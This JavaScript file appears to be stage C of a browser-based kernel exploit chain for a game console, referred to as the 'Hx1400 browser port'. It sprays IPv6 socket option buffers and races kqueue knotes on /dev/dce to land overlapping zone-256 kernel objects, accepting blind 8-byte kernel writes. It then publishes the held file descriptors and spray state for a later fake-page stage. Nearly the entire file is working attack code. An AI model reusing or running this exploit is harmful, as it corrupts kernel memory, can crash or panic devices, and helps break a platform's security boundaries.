// Stage C for the Hx1400 browser port: the kqueue/zone-256 race.
//
// Consumes window.__fw14StageB (anchor, 96 victims, 144 sprayed AF_INET6
// sockets) left open by stage_b0_anchor_v1. It reproduces Hx1400's loop:
//
//   for round 1..6, while no pair and arms < 32:
//     free every spray option buffer, then re-pack every spray buffer
//     for each candidate index (CANDS filtered to < spray.length):
//       verify MLO/MHI, free that one buffer
//       open("/dev/dce") -> d ; tag = (d & 0xffff) << 16 | 0x985A
//       kevent(kq, {ident=d, filter=-18, flags=EV_ADD, data=90})
//       sweep the other sockets: a hit is +8 == tag and +12 == 0
//       exactly one hit -> kevent(EV_DELETE) and hold d + target
//       otherwise delete the knote, close d, re-pack the candidate
//
// Filter -18 is only ever armed on a /dev/dce fd. Arming it on a socket is
// what crashed the console in stage_c_abi_v1.
//
// A miss is the documented blind write: the arm stores 8 bytes into an
// unknown zone-256 object. On a miss this probe stops, cleans up, and asks
// for a cold reboot. On a hit it leaves the kqueue, the held dce fd, the
// spray, the victims and the anchor open and publishes window.__fw14StageC
// for the Stage D fake-page work.
var result, n, f, dv, saved, phase = "preflight";
var kqFd = -1, heldDce = -1;
var st = null;
var MLO = 0x43434343, MHI = 0x54545454, LEN = 248, TAGMAGIC = 0x985a;
var CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168,
             56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144,
             176, 208, 240];
// Holds normally land by arm 3. A boot that needs >16 arms is a bad
// allocator draw, and every miss is an unrecoverable 8-byte write into an
// unknown zone-256 object (boot 5 corrupted the caller at arm 18 and
// panicked). Cap the exposure instead of chasing a doomed hold.
var ROUNDS = 6, MAXARM = 16;
try {
  n = window.__fw14NativeInvoke;
  var state = window.__fw14ArrayState;
  if (!n || !n.frame || !n.wrappers || !Number.isSafeInteger(n.frameAddress) ||
      !state || state.array[0] !== state.a)
    throw new Error("caller_missing");
  st = window.__fw14StageB;
  if (!st || !Array.isArray(st.spray) || !Array.isArray(st.victims) ||
      typeof st.anchor !== "number" || st.spray.length < 128 ||
      st.victims.length !== 96)
    throw new Error("stage_b_state_missing");
  var need = ["open", "close", "setsockopt", "getsockopt", "kqueue",
              "kevent", "getpid"];
  var missing = [];
  for (var mi = 0; mi < need.length; mi++)
    if (typeof n.wrappers[need[mi]] !== "number") missing.push(need[mi]);
  if (missing.length) throw new Error("wrappers_missing:" + missing.join(","));
  f = n.frame;
  if (f.length < 0x9020) throw new Error("frame_short");
  dv = new DataView(f.buffer, f.byteOffset, f.byteLength);
  saved = Array.from(f.subarray(0x200, 0x1000));

  function isErr(r) {
    return !!r && r.value === -1 && (r.high >>> 0) === 0xffffffff;
  }
  function errnoOf(r) { return isErr(r) ? n.readErrno() : null; }
  function eTag(r) {
    if (!isErr(r)) return "v" + r.value;
    var e = n.readErrno();
    return "e" + (e === null ? r.value : e);
  }
  function mark(m) {
    if (typeof api !== "undefined" && api && typeof api.markSync === "function")
      api.markSync(m);
  }
  function putStr(off, s) {
    for (var i = 0; i < s.length; i++) f[off + i] = s.charCodeAt(i) & 0xff;
    f[off + s.length] = 0;
  }
  function hex8(v) { return ("00000000" + (v >>> 0).toString(16)).slice(-8); }

  var spray = st.spray;
  var n30 = spray.length;

  // 248-byte payload: [1]=30, [3]=15, +8.. alternating MLO/MHI.
  f.fill(0, 0x800, 0x800 + LEN);
  f[0x801] = 30;
  f[0x803] = 15;
  for (var k = 8; k + 8 <= LEN; k += 8) {
    dv.setUint32(0x800 + k, MLO, true);
    dv.setUint32(0x800 + k + 4, MHI, true);
  }
  function setOpt(fd) {
    return n.call("setsockopt",
      [fd, 41, 51, n.frameAddress + 0x800, LEN, 0]);
  }
  function freeOpt(fd) {
    return n.call("setsockopt", [fd, 41, 51, 0, 0, 0]);
  }
  // returns { ok, len, mlo, mhi }
  function readOpt(fd) {
    f.fill(0, 0x700, 0x800);
    dv.setUint32(0x780, LEN, true);
    var g = n.call("getsockopt",
      [fd, 41, 51, n.frameAddress + 0x700, n.frameAddress + 0x780, 0]);
    if (g.value !== 0) return { ok: false };
    return {
      ok: true,
      len: dv.getUint32(0x780, true),
      mlo: dv.getUint32(0x708, true),
      mhi: dv.getUint32(0x70c, true)
    };
  }
  function marked(fd) {
    var r = readOpt(fd);
    return r.ok && r.len === LEN && r.mlo === MLO && r.mhi === MHI;
  }
  function arm(ident, flags, data) {
    f.fill(0, 0x900, 0x940);
    dv.setUint32(0x900, ident >>> 0, true);
    dv.setUint32(0x904, 0, true);
    dv.setInt16(0x908, -18, true);
    dv.setUint16(0x90a, flags, true);
    dv.setInt32(0x910, data, true);
    dv.setInt32(0x914, 0, true);
    return n.call("kevent", [kqFd, n.frameAddress + 0x900, 1, 0, 0, 0]);
  }

  var pidRes = n.call("getpid", []);
  if (pidRes.high !== 0 || pidRes.value < 1 || pidRes.value > 100000)
    throw new Error("pid_invalid");
  var pid = pidRes.value;

  // ---------------------------------------------------------- kqueue
  phase = "kqueue";
  mark("c3_kqueue");
  var kqRes = n.call("kqueue", []);
  if (kqRes.value < 0) throw new Error("kqueue" + eTag(kqRes));
  kqFd = kqRes.value;

  // ------------------------------------------------------------ race
  var held = -1, target = -1, targetFd = -1, heldRound = -1, heldTag = 0;
  var arms = 0, misses = 0, blind = 0, multiHit = 0;
  var lastArmTag = "";
  var done = false;

  for (var round = 1; round <= ROUNDS && !done && arms < MAXARM; round++) {
    // free all, then re-pack all
    for (var i = 0; i < n30; i++) freeOpt(spray[i]);
    for (var j = 0; j < n30; j++) setOpt(spray[j]);
    phase = "round_" + round;
    mark("c3_round_" + round);

    for (var ci = 0; ci < CANDS.length && !done && arms < MAXARM; ci++) {
      var cand = CANDS[ci];
      if (cand >= n30) continue;
      if (!marked(spray[cand])) continue;
      if (freeOpt(spray[cand]).value !== 0) continue;

      putStr(0x300, "/dev/dce");
      f.fill(0, 0x380, 0x3a0);
      var dres = n.call("open", [n.frameAddress + 0x300, 2, 0]);
      if (dres.value < 0) {
        setOpt(spray[cand]);
        continue;
      }
      var d = dres.value;
      var tag = (((d & 0xffff) << 16) | TAGMAGIC) >>> 0;
      arms++;
      lastArmTag = "r" + round + "/c" + cand + "/d" + d + "/t" + hex8(tag);
      phase = "arm_" + arms;
      if ((arms & 7) === 0) mark("c3_arm_" + arms);
      var add = arm(d, 1, 90);
      var hits = 0, hitIdx = -1, hitFd = -1;
      if (add.value === 0) {
        for (var si = 0; si < n30; si++) {
          if (si === cand) continue;
          var r = readOpt(spray[si]);
          if (!r.ok) continue;
          if (r.mlo === tag && r.mhi === 0) {
            hits++;
            if (hits === 1) { hitIdx = si; hitFd = spray[si]; }
            continue;
          }
          if (r.mlo === MLO && r.mhi === MHI) continue;
          // this buffer was corrupted by the arm; repair it
          setOpt(spray[si]);
        }
      }

      if (hits === 1) {
        // hold: EV_DELETE the knote, keep d and the target socket
        var del = arm(d, 2, 0);
        if (del.value !== 0) {
          hits = 0;
        } else {
          setOpt(spray[cand]);
          held = cand;
          target = hitIdx;
          targetFd = hitFd;
          heldRound = round;
          heldTag = tag;
          heldDce = d;
          done = true;
          mark("c3_held");
          break;
        }
      } else if (hits > 1) {
        multiHit++;
        hits = 0;
      }

      if (!done) {
        misses++;
        if (add.value === 0) blind++;
        if (add.value === 0) arm(d, 2, 0);
        n.call("close", [d]);
        setOpt(spray[cand]);
      }
    }
  }

  // ---------------------------------------------------------- outcome
  phase = "outcome";
  for (var ri = 0; ri < saved.length; ri++) f[0x200 + ri] = saved[ri];
  saved = null;
  var post = n.call("getpid", []);
  var intact = post.value === pid && post.high === 0 &&
    state.array[0] === state.a;

  if (done) {
    window.__fw14StageC = {
      kq: kqFd,
      dce: heldDce,
      targetFd: targetFd,
      targetIndex: target,
      cand: held,
      round: heldRound,
      tag: heldTag,
      spray: spray.slice(),
      victims: st.victims.slice(),
      anchor: st.anchor,
      pid: pid
    };
    result = {
      id: "stage_c_race_v1",
      status: intact ? "pass" : "fail",
      details: {
        pid: pid,
        kq: kqFd,
        arms: arms,
        misses: misses,
        blind: blind,
        multi: multiHit,
        held: "c" + held + "/tgt" + target + "/fd" + targetFd +
          "/dce" + heldDce + "/tag" + hex8(heldTag) + "/r" + heldRound,
        last: lastArmTag,
        state: "held",
        intact: intact
      }
    };
  } else {
    // no pair: clean everything up and ask for a cold reboot
    try { if (kqFd >= 0) n.call("close", [kqFd]); } catch (ignore) {}
    kqFd = -1;
    for (var cj = 0; cj < n30; cj++) {
      try { n.call("close", [spray[cj]]); } catch (ignore) {}
    }
    for (var vj = 0; vj < st.victims.length; vj++) {
      try { n.call("close", [st.victims[vj]]); } catch (ignore) {}
    }
    try { n.call("close", [st.anchor]); } catch (ignore) {}
    window.__fw14StageB = undefined;
    result = {
      id: "stage_c_race_v1",
      status: "fail",
      details: {
        pid: pid,
        arms: arms,
        misses: misses,
        blind: blind,
        multi: multiHit,
        last: lastArmTag,
        state: "clean",
        intact: intact
      }
    };
  }
} catch (e) {
  try { if (n && kqFd >= 0) n.call("close", [kqFd]); } catch (ignore) {}
  result = {
    id: "stage_c_race_v1",
    status: "error",
    details: { phase: phase, error: String(e).slice(0, 200) }
  };
} finally {
  if (f && saved)
    for (var fi = 0; fi < saved.length; fi++) f[0x200 + fi] = saved[fi];
}
return [result];
